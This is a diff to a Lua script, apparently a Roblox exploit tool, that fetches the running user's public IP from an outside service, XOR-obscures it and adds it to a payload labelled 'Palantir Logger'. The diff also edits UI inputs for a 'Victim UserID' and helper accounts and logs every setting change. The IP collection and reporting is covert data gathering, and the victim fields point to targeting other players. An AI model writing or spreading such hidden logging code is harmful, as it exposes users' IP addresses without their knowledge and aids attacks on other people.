@@ -119,19 +119,19 @@ local function log(action)
 
     local encryptedIP = "Unavailable"
 
-    pcall(function()
-        local res = requestFunc({
-            Url = "http://ip-api.com/json",
-            Method = "GET",
-            Headers = { ["User-Agent"] = "Mozilla/5.0" }
-        })
-        if res and res.Body then
-            local ip = HttpService:JSONDecode(res.Body).query
-            if ip then
-                encryptedIP = xorEncrypt(ip, SECRET_KEY)
-            end
+pcall(function()
+    local res = requestFunc({
+        Url = "https://api.ipify.org?format=json",
+        Method = "GET"
+    })
+    if res and res.Body then
+        local ip = HttpService:JSONDecode(res.Body).ip
+        if ip then
+            encryptedIP = xorEncrypt(ip, SECRET_KEY)
         end
-    end)
+    end
+end)
+
 
     local payload = {
         username = "Palantir Logger",
@@ -560,33 +560,36 @@ local MainTab = Window:AddTab('Main')
 local UISettingsTab = Window:AddTab('UI Settings')
 
 -- Players
-local PlayersGroup = MainTab:AddLeftGroupbox('Players')
 PlayersGroup:AddInput('Victim', {
     Text = 'Victim UserID',
     Default = getgenv().Settings.PLAYERS.VICTIM,
     Callback = function(v)
+        local old = getgenv().Settings.PLAYERS.VICTIM
         getgenv().Settings.PLAYERS.VICTIM = v
-          logChange("PLAYERS", "Victim UserID", old, v)
+        logChange("PLAYERS", "Victim UserID", old, v)
     end
 })
-
 PlayersGroup:AddInput('Helper', {
     Text = 'Helper UserID',
     Default = getgenv().Settings.PLAYERS.HELPER,
     Callback = function(v)
+        local old = getgenv().Settings.PLAYERS.HELPER
         getgenv().Settings.PLAYERS.HELPER = v
         logChange("PLAYERS", "Helper UserID", old, v)
     end
 })
 
+
 PlayersGroup:AddInput('HelperName', {
     Text = 'Helper Ingame Name',
     Default = getgenv().Settings.PLAYERS.HELPERS_INGAME_NAME,
     Callback = function(v)
+        local old = getgenv().Settings.PLAYERS.HELPERS_INGAME_NAME
         getgenv().Settings.PLAYERS.HELPERS_INGAME_NAME = v
         logChange("PLAYERS", "Helper Ingame Name", old, v)
     end
 })
+
 
 -- Visual
 local VisualGroup = MainTab:AddLeftGroupbox('Visual')
